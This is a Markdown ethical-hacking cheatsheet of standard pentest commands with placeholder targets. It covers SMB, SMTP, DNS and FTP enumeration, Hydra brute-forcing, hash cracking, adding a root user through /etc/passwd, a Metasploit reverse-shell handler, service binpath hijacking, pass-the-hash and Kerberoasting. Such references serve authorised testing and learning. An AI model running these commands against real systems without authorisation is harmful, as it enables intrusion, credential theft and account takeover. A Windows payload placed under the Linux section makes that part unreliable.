# Ethical Hacking Cheatsheet

## Table of Contents

- [Service Enumeration](#service-enumeration)
  - [SMB (Server Message Block)](#smb-server-message-block)
  - [SMTP (Simple Mail Transfer Protocol)](#smtp-simple-mail-transfer-protocol)
  - [POP3/IMAP](#pop3imap)
  - [DNS (Domain Name System)](#dns-domain-name-system)
  - [FTP (File Transfer Protocol)](#ftp-file-transfer-protocol)
- [Password Cracking](#password-cracking)
  - [John the Ripper](#john-the-ripper)
  - [Hydra](#hydra)
  - [Hashcat](#hashcat)
- [Privilege Escalation](#privilege-escalation)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [Enumeration](#enumeration)
    - [Exploitation](#exploitation)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Enumeration](#enumeration-1)
    - [Exploitation](#exploitation-1)
  - [Active Directory Enumeration and Exploitation](#active-directory-enumeration-and-exploitation)
    - [Enumeration](#enumeration-2)
    - [Pass-the-Hash](#pass-the-hash)
    - [Kerberoasting](#kerberoasting)
    - [LDAP Enumeration](#ldap-enumeration)


## Service Enumeration

### SMB (Server Message Block)

- Enumerate SMB Shares:
  ```bash
  smbclient -L //<target_ip> -U guest
  ```
- Access SMB Shares:
  ```bash
  smbclient //<target_ip>/<share_name> -U username
  ```
- Enumerate SMB Users and Shares:
  ```bash
  enum4linux <target_ip>
  ```
- Nmap SMB Scripts:
  ```bash
  nmap --script smb-enum-shares,smb-enum-users -p 139,445 <target_ip>
  ```

**Resources:**
- [HackTricks - SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

### SMTP (Simple Mail Transfer Protocol)

- Enumerate Users:
  ```bash
  nmap --script smtp-enum-users -p 25 <target_ip>
  ```
- Manual Interaction:
  ```bash
  telnet <target_ip> 25
  VRFY <username>
  EXPN <username>
  ```

**Resources:**
- [HackTricks - SMTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)

### POP3/IMAP

- Check for Open Ports:
  ```bash
  nmap -p 110,143 <target_ip>
  ```
- Manual Login:
  ```bash
  telnet <target_ip> 110
  USER <username>
  PASS <password>
  ```

**Resources:**
- [HackTricks - POP3/IMAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop3-imap)

### DNS (Domain Name System)

- Basic DNS Query:
  ```bash
  dig @<dns_server> <domain>
  ```
- Zone Transfer:
  ```bash
  dig axfr @<dns_server> <domain>
  ```
- Nslookup:
  ```bash
  nslookup
  server <dns_server>
  ls -d <domain>
  ```

**Resources:**
- [HackTricks - DNS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)

### FTP (File Transfer Protocol)

- Anonymous Login:
  ```bash
  ftp <target_ip>
  ```
- Brute Force FTP Credentials:
  ```bash
  hydra -l <username> -P <wordlist> ftp://<target_ip>
  ```

**Resources:**
- [HackTricks - FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)

---

## Password Cracking

### John the Ripper

- Basic Usage:
  ```bash
  john --wordlist=<wordlist> <hash_file>
  ```
- Show Cracked Passwords:
  ```bash
  john --show <hash_file>
  ```
- Incremental Mode:
  ```bash
  john --incremental <hash_file>
  ```

**Resources:**
- [HackTricks - Password Cracking](https://book.hacktricks.xyz/passwords/password-cracking)

### Hydra

- Brute Force SSH:
  ```bash
  hydra -l <username> -P <wordlist> ssh://<target_ip>
  ```
- Brute Force RDP:
  ```bash
  hydra -l <username> -P <wordlist> rdp://<target_ip>
  ```

**Resources:**
- [HackTricks - Hydra](https://book.hacktricks.xyz/passwords/brute-force-attacks/hydra)

### Hashcat

- Crack NTLM Hashes:
  ```bash
  hashcat -m 1000 <hash_file> <wordlist>
  ```
- Crack MD5 Hashes:
  ```bash
  hashcat -m 0 <hash_file> <wordlist>
  ```
- Resume Cracking:
  ```bash
  hashcat --session <session_name> --restore
  ```

**Resources:**
- [HackTricks - Hashcat](https://book.hacktricks.xyz/passwords/password-cracking/hashcat)

---
## Vulnerability Scan & Analysis

### Automated scan
- Use OpenVAS to perform scan
  ```bash
  #download docker image
  #use docker to run image
  docker run -d -p 443:443 --name openvas [your_docker_path]
  #OpenVAS starts on 127.0.0.1, run scan in SCANS->TASKS
  ```
- 
## Privilege Escalation

### Linux Privilege Escalation

#### Enumeration

- Find SUID Binaries:
  ```bash
  find / -perm -4000 2>/dev/null
  ```
- Identify Writable Directories:
  ```bash
  find / -type d -perm -o+w 2>/dev/null
  ```
- Check for World-Writable Files:
  ```bash
  find / -type f -perm -o+w 2>/dev/null
  ```
- Check sudo Permissions:
  ```bash
  sudo -l
  ```

**Resources:**
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

#### Exploitation

- Exploit SUID Binaries:
  ```bash
  ./<binary_name>
  ```
- Abuse sudo:
  ```bash
  sudo <command>
  ```
- Modify /etc/passwd:
  ```bash
  echo 'newuser:x:0:0::/root:/bin/bash' >> /etc/passwd
  ```
- Use msfconsole:
   ```bash
   msfconsole -q
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT 4444
   run
   ```

**Resources:**
- [HackTricks - SUID Exploitation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux/sudo-and-suid)

### Windows Privilege Escalation

#### Enumeration

- Check for Misconfigurations:
  ```powershell
  whoami /priv
  ```
- Search for Unquoted Service Paths:
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\"
  ```

**Resources:**
- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

#### Exploitation

- Exploit Weak Service Permissions:
  ```cmd
  sc config <service_name> binpath= "cmd.exe /k whoami > C:\tmp\output.txt"
  ```

**Resources:**
- [HackTricks - Service Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/service-permissions-exploitation)

### Active Directory Enumeration and Exploitation

#### Enumeration

- List Domain Users:
  ```powershell
  Get-ADUser -Filter * | Select-Object Name
  ```
- List Domain Groups:
  ```powershell
  Get-ADGroup -Filter * | Select-Object Name
  ```
- Enumerate Group Membership:
  ```powershell
  Get-ADGroupMember -Identity "Domain Admins"
  ```

**Resources:**
- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

#### Pass-the-Hash

- Authenticate Using a Hash:
  ```bash
  psexec.py DOMAIN/username@<ip> -hashes <hash>:<hash>
  ```

**Resources:**
- [HackTricks - Pass-the-Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash)

#### Kerberoasting

- Dump Service Tickets:
  ```powershell
  Invoke-Kerberoast -OutputFormat Hashcat
  ```
- Crack Tickets:
  ```bash
  hashcat -m 13100 <ticket_file> <wordlist>
  ```

**Resources:**
- [HackTricks - Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting)

#### LDAP Enumeration

- Query LDAP:
  ```bash
  ldapsearch -x -h <domain_controller> -b "dc=example,dc=com"
  ```

**Resources:**
- [HackTricks - LDAP Enumeration](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ldap-enumeration)

#### Wireshark Filters
- ip.addr == 192.168.1.1
- ip.src == 192.168.1.1
- ip.dst == 192.168.1.1
- tcp.port == 80
- tcp.srcport == 443
- tcp.dstport == 22
